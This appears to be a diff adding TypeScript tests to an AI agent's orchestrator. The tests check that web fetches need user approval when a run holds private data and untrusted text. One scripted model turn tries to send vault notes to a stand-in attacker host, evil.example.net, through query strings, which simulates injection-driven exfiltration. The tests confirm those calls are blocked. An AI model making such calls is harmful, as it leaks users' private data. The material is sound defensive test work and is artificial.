@@ -172,6 +172,86 @@ describe("the orchestrator", () => {
   });
 });
 
+describe("a step onto the internet (plan P4, Rule of Two)", () => {
+  // A conversation that reads the vault and may fetch pages: untrusted text, private data and a way out — all three.
+  const withWeb = () => appendTurn(startConversation("c", "system", ["search_vault", "fetch_url"]), { role: "user", parts: [{ type: "text", text: "Compare my offer with the published rates" }], at });
+  const fetchCall = (id: string, url: string) => ({ id, name: "fetch_url", args: { url, question: "What are the rates?" } });
+  const ran: string[] = [];
+  const recording: ToolExecutor = {
+    async execute(tool, args) {
+      ran.push(`${tool.name} ${(args as { url?: string }).url ?? ""}`.trim());
+      return { content: "a report", origin: { kind: "web", url: (args as { url: string }).url } };
+    },
+  };
+
+  it("asks for each one while the run holds private data, and a no is an answer, not a failure", async () => {
+    ran.length = 0;
+    const asked: unknown[] = [];
+    const result = await runAgent({
+      conversation: withWeb(),
+      egress: scriptedEgress([
+        turn({ calls: [fetchCall("1", "https://example.org/rates"), fetchCall("2", "https://evil.example.net/?d=notes"), fetchCall("3", "https://evil.example.net/?d=more"), fetchCall("4", "https://evil.example.net/?d=most")] }),
+        turn({ text: "The published day rate is 1,900 euros." }),
+      ]),
+      endpoint: anthropic,
+      model: "m",
+      executor: recording,
+      context: { privateContext: true, untrustedContext: true },
+      approveEffect: async (call, tool) => {
+        asked.push([tool.name, call.args]);
+        return (call.args as { url: string }).url.startsWith("https://example.org/");
+      },
+      now: () => at,
+    });
+    // Every call was put to the user, with its validated arguments — the address is what they decide on.
+    expect(asked).toHaveLength(4);
+    expect(asked[0]).toEqual(["fetch_url", { url: "https://example.org/rates", question: "What are the rates?" }]);
+    // Only the approved one left the device.
+    expect(ran).toEqual(["fetch_url https://example.org/rates"]);
+    const results = result.conversation.turns[2]!.parts as ToolResultPart[];
+    expect(results[0]!.content).toContain('<untrusted_data origin="web:https://example.org/rates" trust="3">');
+    expect(results.slice(1).map((r) => [r.isError, r.content])).toEqual(Array.from({ length: 3 }, () => [true, "The user did not approve this action."]));
+    // Three refusals in a row are three answers: the run goes on and the model can say so.
+    expect(result.stop).toEqual({ kind: "answered" });
+  });
+
+  it("refuses when there is nobody to ask", async () => {
+    ran.length = 0;
+    const result = await runAgent({
+      conversation: withWeb(),
+      egress: scriptedEgress([turn({ calls: [fetchCall("1", "https://example.org/rates")] }), turn({ text: "I could not read the page." })]),
+      endpoint: anthropic,
+      model: "m",
+      executor: recording,
+      context: { privateContext: true, untrustedContext: true },
+      now: () => at,
+    });
+    expect(ran).toEqual([]);
+    expect((result.conversation.turns[2]!.parts[0] as ToolResultPart).content).toBe("The user did not approve this action.");
+  });
+
+  it("does not ask where the run holds nothing private", async () => {
+    ran.length = 0;
+    const asked: string[] = [];
+    await runAgent({
+      conversation: appendTurn(startConversation("c", "system", ["fetch_url"]), { role: "user", parts: [{ type: "text", text: "What does this page say?" }], at }),
+      egress: scriptedEgress([turn({ calls: [fetchCall("1", "https://example.org/rates")] }), turn({ text: "It lists the rates." })]),
+      endpoint: anthropic,
+      model: "m",
+      executor: recording,
+      context: { privateContext: false, untrustedContext: false },
+      approveEffect: async (call) => {
+        asked.push(call.name);
+        return false;
+      },
+      now: () => at,
+    });
+    // Untrusted text and a way out, but nothing to carry out: two of three.
+    expect(asked).toEqual([]);
+    expect(ran).toEqual(["fetch_url https://example.org/rates"]);
+  });
+});
+
 describe("a busy provider", () => {
   const run = (answers: EgressChunk[][], extra: Partial<Parameters<typeof runAgent>[0]> = {}) => {
     const egress = scriptedEgress(answers);
